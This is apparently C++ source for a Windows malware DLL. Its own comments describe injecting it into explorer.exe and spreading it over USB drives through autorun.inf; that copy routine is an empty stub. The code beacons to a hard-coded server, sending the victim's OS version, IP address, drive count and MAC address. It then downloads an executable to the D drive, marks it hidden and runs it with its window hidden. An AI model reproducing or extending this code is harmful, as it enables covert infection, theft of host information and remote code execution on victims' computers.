// private_dll.cpp : 定义 DLL 应用程序的导出函数。
//

#include "stdafx.h"
#include "private_dll.h"
#include <windows.h>
#include <stdio.h>
#include <process.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include "proto.h"
#include <dbt.h>
#include "log.h"
#include <math.h>
#include <vector>
#include <string>
#include <Iphlpapi.h>
#include <shellapi.h>
using namespace std;

#pragma warning(disable: 4996)
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib,"Iphlpapi.lib")
#pragma comment(lib,"Shell32.lib")

#define LOG_FILE  "dll_log.log"

#define SERVER_ADDR "171.1.2.13"
#define SERVER_PORT 4587

#define UDP_CLIENT_STATE_INIT  0
#define UDP_CLIENT_STATE_SEND_GET_REQ 1
#define UDP_CLIENT_STATE_RECV_GET_REP 2
#define UDP_CLIENT_STATE_SEND_DOWNLOAD_REQ 3
#define UDP_CLIENT_STATE_WAIT_FOR_DOWNLOAD 4

#define BOOTSTRAP_PRGRAM_PATH_NAME "d:\\bootstrap.exe"


typedef struct client_status
{
	SOCKET sock;
	int state;
	float local_version;
	float server_version;
	SOCKADDR_IN download_addr;
}CLIENT_STATUS_T;


typedef struct local_drive{
	string drive_name;
	unsigned int  drive_type;
}LOCAL_DRIVE_T;


char host_exe_path_[512] = { 0 };
bool geted_host_exe_path_ = false;
HANDLE hLocalProcHandle_ = NULL;
HANDLE hUsbInsertEventHandle_ = NULL;
BOOL bQuit_ = FALSE;
int osVersion_ = 0;
BOOL isVistaLaterOS_ = FALSE;
CLIENT_STATUS_T client_status_ = { 0 };
vector<LOCAL_DRIVE_T> local_drives_;
float local_bootstrap_version_ = 0.0f;
BOOL isFirstDataPacket_ = TRUE;
FILE *bootstrapHandle_ = NULL;

void *loger_ = NULL;

/*1.Being used to listen usb event, when usb inserted into computer,
copy the files(private_dll.dll, inj.exe, autorun.inf) to usb.
and write an AutoRun.inf scripts into usb to infect other computers.
2. register to server
3. get command from server. maybe run the bootstrap.exe which is downloaded from the server
4. get the path of the programs from inj.exe*/
#define DLL_FILE "private_dll.dll"

/*inject dll into explorer.exe process and tell the dll the programs's path*/
#define INJ_FILE "inj.exe"

/*auto run the program . copy files(private_dll.dll, inj.exe) into compute's  partition of D and
register the inj.exe as an startup program with boot of the computer */
#define AUTO_RUN_INF "autorun.inf"





BOOL IsVistaOrLater()
{
	OSVERSIONINFO osvi;
	ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&osvi);
	if (osvi.dwMajorVersion >= 6)
	{
		osVersion_ = osvi.dwMajorVersion;
		return TRUE;
	}
	return FALSE;
}

typedef BOOL(WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
LPFN_ISWOW64PROCESS fnIsWow64Process;

BOOL IsWow64()
{
	BOOL bIsWow64 = FALSE;
	fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(GetModuleHandle(TEXT("kernel32")), "IsWow64Process");
	if (NULL != fnIsWow64Process)
	{
		if (!fnIsWow64Process(GetCurrentProcess(), &bIsWow64))
		{
			return FALSE;
		}
	}
	return bIsWow64;
}



void InitNetwork()
{
	WORD wVersionRequested;
	WSADATA wsaData;
	int err;

	wVersionRequested = MAKEWORD(2, 2);
	err = WSAStartup(wVersionRequested, &wsaData);
	if (err != 0) {
		return;
	}

	if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2) {
		WSACleanup();
	}
	return;
}


void CleanupNetwork()
{
	WSACleanup();
}


unsigned __stdcall localProc(void* pArguments)
{
	SOCKET sockSrv = socket(AF_INET, SOCK_DGRAM, 0);

	SOCKADDR_IN  addrServ;
	addrServ.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
	addrServ.sin_family = AF_INET;
	addrServ.sin_port = htons(UDP_SERVER_PORT);

	bind(sockSrv, (SOCKADDR*)&addrServ, sizeof(SOCKADDR));

	SOCKADDR_IN  addrClient = { 0 };
	int length = sizeof(SOCKADDR);
	char recvBuf[1024] = { 0 };
	int ret = 0;
	while (!bQuit_)
	{
		ret = recvfrom(sockSrv, recvBuf, 1024, 0, (SOCKADDR*)&addrClient, &length);
		LOCAL_PROTO_T *hdr = (LOCAL_PROTO_T *)recvBuf;
		char *body = NULL;
		if (hdr->version == PROTO_VERSION &&
			hdr->msg_type == MSG_TYPE_BOOTSTRAP_LOCAL_PATH)
		{
			body = recvBuf + sizeof(LOCAL_PROTO_T);
			memcpy(host_exe_path_, body, hdr->body_len);
			geted_host_exe_path_ = true;
		}
	}
	closesocket(sockSrv);
	WSACleanup();
	return 0;
}

//copy programs into usb 
void copy_programs_to_usb(char usb)
{

}



LRESULT CALLBACK WndProc(HWND h, UINT msg, WPARAM wp, LPARAM lp)
{
	if (msg == WM_DEVICECHANGE) {
		if ((DWORD)wp == DBT_DEVICEARRIVAL) {
			DEV_BROADCAST_VOLUME* p = (DEV_BROADCAST_VOLUME*)lp;
			if (p->dbcv_devicetype == DBT_DEVTYP_VOLUME) {
				int l = (int)(log(double(p->dbcv_unitmask)) / log(double(2)));
				log_write(loger_, "啊……%c盘插进来了\n", 'A' + l);
				copy_programs_to_usb(l + 'A');
			}
		}
		else if ((DWORD)wp == DBT_DEVICEREMOVECOMPLETE) {
			DEV_BROADCAST_VOLUME* p = (DEV_BROADCAST_VOLUME*)lp;
			if (p->dbcv_devicetype == DBT_DEVTYP_VOLUME) {
				int l = (int)(log(double(p->dbcv_unitmask)) / log(double(2)));
				log_write(loger_, "啊……%c盘被拔掉了\n", 'A' + l);
			}
		}
		return TRUE;
	}
	else return DefWindowProc(h, msg, wp, lp);
}


unsigned __stdcall usbEventProc(void* pArguments)
{
	WNDCLASS wc;
	ZeroMemory(&wc, sizeof(wc));
	wc.lpszClassName = TEXT("usb_listener");
	wc.lpfnWndProc = WndProc;

	RegisterClass(&wc);
	HWND h = CreateWindow(TEXT("usb_listener"), TEXT(""), 0, 0, 0, 0, 0,
		0, 0, GetModuleHandle(0), 0);
	MSG msg;
	while (GetMessage(&msg, 0, 0, 0) > 0) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return 0;
}



SOCKET create_local_datagramsock_and_bind()
{
	int ret = 0;
	SOCKET sock = socket(AF_INET, SOCK_DGRAM, 0);
	SOCKADDR_IN  addrlocal;
	addrlocal.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
	addrlocal.sin_family = AF_INET;
	addrlocal.sin_port = htons(0);

	ret = bind(sock, (SOCKADDR*)&addrlocal, sizeof(SOCKADDR));
	if (ret == SOCKET_ERROR){
		return 0;
	}
	return sock;
}

int get_os_version()
{
	return osVersion_;
}

int get_local_ipv4_addr()
{
	int nLen = 256;
	char hostname[20];
	gethostname(hostname, nLen);
	hostent *pHost = gethostbyname(hostname);
	char *lpAddr = pHost->h_addr_list[0];
	struct in_addr inAddr;
	memmove(&inAddr, lpAddr, 4);
	return inAddr.S_un.S_addr;
}

char get_number_of_partition()
{
	DWORD dwSize = MAX_PATH;
	unsigned short count = 0;
	char szLogicalDrives[MAX_PATH] = { 0 };
	local_drives_.clear();
	//获取逻辑驱动器号字符串
	DWORD dwResult = GetLogicalDriveStrings(dwSize, szLogicalDrives);
	if (dwResult > 0 && dwResult <= MAX_PATH) {
		char* szSingleDrive = szLogicalDrives;  //从缓冲区起始地址开始
		while (*szSingleDrive) {
			LOCAL_DRIVE_T ldr;
			ldr.drive_name = szSingleDrive;
			UINT uDriverType = GetDriveType(ldr.drive_name.c_str());
			ldr.drive_type = uDriverType;
			szSingleDrive += strlen(szSingleDrive) + 1;
			count++;
			local_drives_.push_back(ldr);
		}
	}
	return (char)count;
}

char *get_mac_address()
{
	static char mac_addr[6 + 1] = { 0 };
	memset(mac_addr, 0, 7);
	PIP_ADAPTER_INFO pIpAdapterInfo = new IP_ADAPTER_INFO();
	unsigned long stSize = sizeof(IP_ADAPTER_INFO);
	int nRel = GetAdaptersInfo(pIpAdapterInfo, &stSize);
	if (ERROR_BUFFER_OVERFLOW == nRel)
	{
		delete pIpAdapterInfo;
		pIpAdapterInfo = (PIP_ADAPTER_INFO)new BYTE[stSize];
		nRel = GetAdaptersInfo(pIpAdapterInfo, &stSize);
	}
	if (ERROR_SUCCESS == nRel)
	{
		if (pIpAdapterInfo)
		{
			memcpy(mac_addr, pIpAdapterInfo->Address, 6);
		}
	}
	//释放内存空间
	if (pIpAdapterInfo)
	{
		delete pIpAdapterInfo;
	}
	return mac_addr;
}


unsigned __stdcall registerProc(void* pArguments)
{
	int ret = 0;
	char buffer[512] = { 0 };
	int data_len = 0;
	char *body = NULL;
	char *ptr = NULL;
	int total_len = 0;

	SOCKET sock = create_local_datagramsock_and_bind();
	if (sock == 0){
		return ret;
	}

	SOCKADDR_IN  addrServ;
	addrServ.sin_addr.S_un.S_addr = inet_addr(SERVER_ADDR);
	addrServ.sin_family = AF_INET;
	addrServ.sin_port = htons(SERVER_PORT);
	
	while (!bQuit_)
	{
		LOCAL_PROTO_T *hdr = (LOCAL_PROTO_T *)buffer;
		hdr->version = PROTO_VERSION;
		hdr->msg_type = MSG_TYPE_REGISTER;
		hdr->body_len = 0;
		body = buffer + sizeof(LOCAL_PROTO_T);
		ptr = body;
		(*(int *)ptr) = get_os_version();
		ptr += sizeof(int);
		(*(int *)ptr) = get_local_ipv4_addr();
		ptr += sizeof(int);
		(*(char *)ptr) = get_number_of_partition();
		ptr += sizeof(char);
		memcpy(ptr, get_mac_address(), 6);
		ptr += 6;
		data_len = (int)(ptr - body);
		hdr->body_len = data_len;
		total_len = (int)(ptr - (char *)hdr);
		sendto(sock, buffer, total_len, 0, (sockaddr *)&addrServ, sizeof(addrServ));
		Sleep(1000 * 3000);//50 min
	}
	return 0;
}


void setFileHidden(char *file)
{
	string filepath = file;
	string strCmd = "attrib +h" + filepath;
	WinExec(strCmd.c_str(), 0);
}


void onGetBootStrapVersion(CLIENT_STATUS_T *client, float version)
{
	char buffer[512] = { 0 };
	LOCAL_PROTO_T *hdr = (LOCAL_PROTO_T*)buffer;

	if (version > local_bootstrap_version_)
	{
		SOCKADDR_IN  addrServ;
		addrServ.sin_addr.S_un.S_addr = inet_addr(SERVER_ADDR);
		addrServ.sin_family = AF_INET;
		addrServ.sin_port = htons(SERVER_PORT);

		client->local_version = local_bootstrap_version_;
		local_bootstrap_version_ = version;
		client->server_version = version;
		hdr->totol_len = sizeof(LOCAL_PROTO_T);
		hdr->version = PROTO_VERSION;
		hdr->msg_type = MSG_TYPE_DOWNLOAD_BOOTSTRAP_REQ;
		hdr->body_len = 0;
		sendto(client->sock, buffer, sizeof(LOCAL_PROTO_T), 0, (sockaddr *)&addrServ, sizeof(addrServ));
		client->state = UDP_CLIENT_STATE_WAIT_FOR_DOWNLOAD;
	}
}



SOCKET create_local_streamsock_and_bind()
{
	int ret = 0;
	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
	SOCKADDR_IN  addrlocal;
	addrlocal.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
	addrlocal.sin_family = AF_INET;
	addrlocal.sin_port = htons(0);

	ret = bind(sock, (SOCKADDR*)&addrlocal, sizeof(SOCKADDR));
	if (ret == SOCKET_ERROR){
		return 0;
	}
	return sock;
}


void onDownloadDataEnd(CLIENT_STATUS_T *client)
{
	isFirstDataPacket_ = TRUE;
	if (bootstrapHandle_ != NULL)
		fclose(bootstrapHandle_);
	bootstrapHandle_ = NULL;
	client->state = UDP_CLIENT_STATE_INIT;
	Sleep(1000);

	//execute bootstrap.exe 
	SHELLEXECUTEINFO ShExecInfo = { 0 };
	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	ShExecInfo.hwnd = NULL;
	ShExecInfo.lpVerb = "open";
	ShExecInfo.lpFile = BOOTSTRAP_PRGRAM_PATH_NAME;
	ShExecInfo.lpParameters = NULL;
	ShExecInfo.lpDirectory = NULL;
	ShExecInfo.nShow = SW_HIDE;
	ShExecInfo.hInstApp = NULL;
	ShellExecuteEx(&ShExecInfo);
}


unsigned __stdcall downloadProc(void* pArguments)
{
	CLIENT_STATUS_T *client = (CLIENT_STATUS_T *)pArguments;
	int ret = 0;
	int receive_len = 0;
	SOCKET sock = create_local_streamsock_and_bind();
	char buffer[1500] = { 0 };

	ret = connect(sock, (sockaddr *)&client->download_addr, sizeof(SOCKADDR_IN));
	while (ret == 0)
	{
		receive_len = recv(sock, buffer, sizeof(buffer), 0);
		if (receive_len <= 0)
		{
			closesocket(sock);
			break;
		}
		else
		{
			if (bootstrapHandle_ != NULL)
				fwrite(buffer, receive_len, 1, bootstrapHandle_);
		}
	}
	onDownloadDataEnd(client);
	return 0;
}


void beginDownload(CLIENT_STATUS_T *client)
{
	HANDLE handle;
	unsigned threadID;
	if (local_drives_.size() >= 2)
	{
		bootstrapHandle_ = fopen(BOOTSTRAP_PRGRAM_PATH_NAME, "wb+");
		setFileHidden(BOOTSTRAP_PRGRAM_PATH_NAME);
	}
	handle = (HANDLE)_beginthreadex(NULL, 0, &downloadProc, client, 0, &threadID);
	CloseHandle(handle);

}




#define CONTINUE_READ -1
#define READ_OK  0

int onPacketRead(CLIENT_STATUS_T *client, char * packet, int len)
{
	char *ptr = NULL;
	LOCAL_PROTO_T *hdr = (LOCAL_PROTO_T *)packet;
	if (hdr->version != PROTO_VERSION)
		return READ_OK;

	switch (client->state)
	{
	case UDP_CLIENT_STATE_SEND_GET_REQ:
		if (hdr->msg_type == MSG_TYPE_REPLY_BOOTSTRAP_VERSION)
		{
			client->state = UDP_CLIENT_STATE_RECV_GET_REP;
			ptr = packet + sizeof(LOCAL_PROTO_T);
			float version = *(float *)ptr;
			onGetBootStrapVersion(client, version);
		}
		break;
	case UDP_CLIENT_STATE_INIT:
	case UDP_CLIENT_STATE_RECV_GET_REP:
		break;
	case UDP_CLIENT_STATE_WAIT_FOR_DOWNLOAD:
		if (hdr->msg_type == MSG_TYPE_DOWNLOAD_BOOTSTRAP_REPLY)
		{
			ptr = packet + sizeof(LOCAL_PROTO_T);
			SOCKADDR_IN addrDownload = { 0 };
			addrDownload.sin_addr.S_un.S_addr = *(ULONG *)ptr;
			ptr += sizeof(ULONG);
			addrDownload.sin_family = AF_INET;
			addrDownload.sin_port = *(short *)ptr;
			memcpy(&client->download_addr, &addrDownload, sizeof(SOCKADDR_IN));
			beginDownload(client);
			
		}
		break;
	}
	return READ_OK;
}



int create_get_version_req(char *ptr)
{
	LOCAL_PROTO_T *hdr = (LOCAL_PROTO_T *)ptr;
	hdr->totol_len = sizeof(LOCAL_PROTO_T);
	hdr->version = PROTO_VERSION;
	hdr->msg_type = MSG_TYPE_GET_BOOTSTRAP_VERSION;
	hdr->body_len = 0;
	return sizeof(LOCAL_PROTO_T);
}


//get bootstrap.exe and excute
unsigned __stdcall bootstrapProc(void* pArguments)
{
	int ret = 0;
	char buffer[1500] = { 0 };
	FD_SET readSet;
	struct timeval timeout = { 0 };
	FD_ZERO(&readSet);
	char packet[1500] = { 0 };
	SOCKET sock;
	int len = 0;


	SOCKADDR_IN  addrServ;
	addrServ.sin_addr.S_un.S_addr = inet_addr(SERVER_ADDR);
	addrServ.sin_family = AF_INET;
	addrServ.sin_port = htons(SERVER_PORT);

	SOCKADDR_IN addrFrom = { 0 };
	int fromLen = sizeof(SOCKADDR_IN);
	LOCAL_PROTO_T *hdr;


	sock = create_local_datagramsock_and_bind();
	if(sock == 0){
		return ret;
	}
	client_status_.sock = sock;
	while (!bQuit_)
	{
		if (client_status_.state == UDP_CLIENT_STATE_INIT)
		{
			len = create_get_version_req(buffer);
			client_status_.state = UDP_CLIENT_STATE_SEND_GET_REQ;
			ret = sendto(sock, buffer, len, 0, (sockaddr *)&addrServ, sizeof(SOCKADDR_IN));
		}
		else
		{
			ret = 1;
			Sleep(1000 * 60);
		}
		if (ret > 0)
		{
			timeout.tv_sec = 10;
			FD_SET(sock, &readSet);
			ret = select(0, &readSet, NULL, NULL, &timeout);
			if (ret > 0)
			{//read data
				FD_ZERO(&readSet);
				ret = recvfrom(sock, buffer, sizeof(buffer), 0, (sockaddr *)&addrFrom, &fromLen);
				if (ret > 0)
				{
					hdr = (LOCAL_PROTO_T *)buffer;
					onPacketRead(&client_status_, buffer, ret);
					
				}
				else
				{
					closesocket(sock);
					sock = create_local_datagramsock_and_bind();
					client_status_.sock = sock;
					client_status_.state = UDP_CLIENT_STATE_INIT;
					Sleep(1000 * 300);
					continue;
				}
					
			}
			else if (ret == 0) //timeout
			{
				Sleep(1000 * 10);
				continue;
			}
			else //error
			{
				closesocket(sock);
				sock = create_local_datagramsock_and_bind();
				client_status_.sock = sock;
				client_status_.state = UDP_CLIENT_STATE_INIT;
				Sleep(1000 * 300);
			}
		}
		else
		{
			closesocket(sock);
			sock = create_local_datagramsock_and_bind();
			client_status_.state = UDP_CLIENT_STATE_INIT;
			client_status_.sock = sock;
			Sleep(1000 * 300);
		}
	}
	return 0;
}



void Init(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{

	loger_ = log_create(LOG_FILE);
	isVistaLaterOS_ = IsVistaOrLater();

	log_write(loger_, "os version 0x%x \n", get_os_version());
	InitNetwork();
	//listen on localhost machine  for geting the path of inj.exe 
	unsigned threadID1, threadID2, threadID3;

	hLocalProcHandle_ = (HANDLE)_beginthreadex(NULL, 0, &localProc, NULL, 0, &threadID1);
	CloseHandle(hLocalProcHandle_);
	hLocalProcHandle_ = NULL;

	//listen usb insert event
	hUsbInsertEventHandle_ = (HANDLE)_beginthreadex(NULL, 0, &usbEventProc, NULL, 0, &threadID2);
	CloseHandle(hUsbInsertEventHandle_);
	hUsbInsertEventHandle_ = NULL;


	//network thread for comunicating with server
	HANDLE registerhandler;
	registerhandler = (HANDLE)_beginthreadex(NULL, 0, &registerProc, NULL, 0, &threadID3);
	CloseHandle(registerhandler);


	HANDLE bootstraphandler;
	bootstraphandler = (HANDLE)_beginthreadex(NULL, 0, &bootstrapProc, NULL, 0, &threadID3);
	CloseHandle(bootstraphandler);



}

void UnInit(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	bQuit_ = TRUE;
	log_write(loger_, "dll exit\n");
}